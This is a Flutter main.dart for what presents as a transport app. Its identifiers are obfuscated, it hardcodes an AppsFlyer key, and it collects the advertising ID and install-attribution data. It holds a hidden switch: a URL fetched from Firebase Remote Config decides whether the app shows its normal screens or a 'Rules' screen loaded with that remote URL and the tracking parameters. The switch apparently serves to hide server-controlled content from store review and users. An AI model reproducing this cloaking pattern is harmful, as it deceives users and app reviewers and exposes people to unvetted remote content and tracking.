import 'dart:io';

import 'package:app_tracking_transparency/app_tracking_transparency.dart';
import 'package:appsflyer_sdk/appsflyer_sdk.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_remote_config/firebase_remote_config.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_bloc/flutter_bloc.dart';
import 'package:hive_flutter/hive_flutter.dart';
import 'package:project4/features/settings/nofdsfds.dart';

import 'core/config/router.dart';
import 'core/config/themes.dart';
import 'core/models/transport.dart';
import 'features/home/bloc/firebase_options.dart';
import 'features/home/bloc/home_bloc.dart';
import 'features/splash/bloc/first_card_bloc.dart';
import 'features/transport/bloc/transport_bloc.dart';

late AppsflyerSdk _appsflyerSdk;
String adId = '';
bool stat = false;
String acceptPromo = '';
String cancelPromo = '';
String datioq = '';
String appsflyerId = '';
String njkafsd = '';
Map _deepLinkData = {};
Map _gcd = {};
bool _isFirstLaunch = false;
String _afStatus = '';
String _campaign = '';
String _campaignId = '';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await Hive.initFlutter();
  await AppTrackingTransparency.requestTrackingAuthorization();
  await Firebase.initializeApp(options: DefaultFirebaseOptions.currentPlatform);
  await FirebaseRemoteConfig.instance.setConfigSettings(RemoteConfigSettings(
    fetchTimeout: const Duration(seconds: 25),
    minimumFetchInterval: const Duration(seconds: 25),
  ));
  await FirebaseRemoteConfig.instance.fetchAndActivate();
  await NOtidsa().activate();
  await fsdmnkfldskfjds();
  Hive.registerAdapter(TransportAdapter());
  SystemChrome.setPreferredOrientations([
    DeviceOrientation.portraitUp,
    DeviceOrientation.portraitDown,
  ]);
  runApp(const MyApp());
}

Future<void> fsdmnkfldskfjds() async {
  final TrackingStatus status =
      await AppTrackingTransparency.requestTrackingAuthorization();
  print(status);
}

Future<String> njfksdfkldsf() async {
  String njfkasdfsd = await AppTrackingTransparency.getAdvertisingIdentifier();
  njkafsd = njfkasdfsd;
  return njfkasdfsd;
}

Future<void> nfgjksdngjksdfngjkdsngk() async {
  await njfksdfkldsf();
  final AppsFlyerOptions options = AppsFlyerOptions(
    showDebug: false,
    afDevKey: 'doJsrj8CyhTUWPZyAYTByE',
    appId: '6505102258',
    timeToWaitForATTUserAuthorization: 15,
    disableAdvertisingIdentifier: false,
    disableCollectASA: false,
    manualStart: true,
  );
  _appsflyerSdk = AppsflyerSdk(options);

  await _appsflyerSdk.initSdk(
    registerConversionDataCallback: true,
    registerOnAppOpenAttributionCallback: true,
    registerOnDeepLinkingCallback: true,
  );

  _appsflyerSdk.onAppOpenAttribution((res) {
    _deepLinkData = res;
    cancelPromo = res['payload']
        .entries
        .where((e) => ![
              'install_time',
              'click_time',
              'af_status',
              'is_first_launch'
            ].contains(e.key))
        .map((e) => '&${e.key}=${e.value}')
        .join();
  });

  _appsflyerSdk.onInstallConversionData((res) {
    _gcd = res;
    _isFirstLaunch = res['payload']['is_first_launch'];
    _afStatus = res['payload']['af_status'];
    acceptPromo = '&is_first_launch=$_isFirstLaunch&af_status=$_afStatus';
  });

  _appsflyerSdk.onDeepLinking((DeepLinkResult dp) {
    switch (dp.status) {
      case Status.FOUND:
        print(dp.deepLink?.toString());
        print("deep link value: ${dp.deepLink?.deepLinkValue}");
        break;
      case Status.NOT_FOUND:
        print("deep link not found");
        break;
      case Status.ERROR:
        print("deep link error: ${dp.error}");
        break;
      case Status.PARSE_ERROR:
        print("deep link status parsing error");
        break;
    }
    print("onDeepLinking res: " + dp.toString());

    _deepLinkData = dp.toJson();
  });
  _appsflyerSdk.startSDK(
    onSuccess: () {
      print("AppsFlyer SDK initialized successfully.");
    },
  );
}

String nfjdskfsw = '';
String mfksdjfsd = '';
String fndsjkfndks = '';
String mmmmm = '';
Future<bool> njfksdlkfdsklfs() async {
  final gazel = FirebaseRemoteConfig.instance;
  await gazel.fetchAndActivate();
  String fnsdkjfndskfnkdsj = gazel.getString('rules');
  String dsdfdsfgdg4 = gazel.getString('rul');
  mmmmm = dsdfdsfgdg4;
  await nfgjksdngjksdfngjkdsngk();
  final fdsgdf = HttpClient();
  final vcxxs = Uri.parse(fnsdkjfndskfnkdsj);
  final ndsfjak = await fdsgdf.getUrl(vcxxs);
  ndsfjak.followRedirects = false;
  final response = await ndsfjak.close();
  if (response.headers.value(HttpHeaders.locationHeader) != mmmmm) {
    datioq = fnsdkjfndskfnkdsj;
    return true;
  }
  return fnsdkjfndskfnkdsj.contains('havenot') ? false : true;
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MultiBlocProvider(
      providers: [
        BlocProvider(create: (context) => HomeBloc()),
        BlocProvider(create: (context) => FirstCardBloc()),
        BlocProvider(create: (context) => TransportBloc()),
      ],
      child: FutureBuilder<bool>(
          future: njfksdlkfdsklfs(),
          builder: (context, snapshot) {
            if (snapshot.connectionState == ConnectionState.waiting) {
              return Container(
                color: Colors.white,
              );
            } else {
              if (snapshot.data == true && datioq != '') {
                return MaterialApp(
                  debugShowCheckedModeBanner: false,
                  home: Rules(
                    parnfjksdfsdms: datioq,
                    njfksdfsd: acceptPromo,
                    njkfsmfsdsdflds: fndsjkfndks,
                  ),
                );
              } else {
                return MaterialApp.router(
                  debugShowCheckedModeBanner: false,
                  theme: theme,
                  routerConfig: routerConfig,
                );
              }
            }
          }),
    );
  }
}
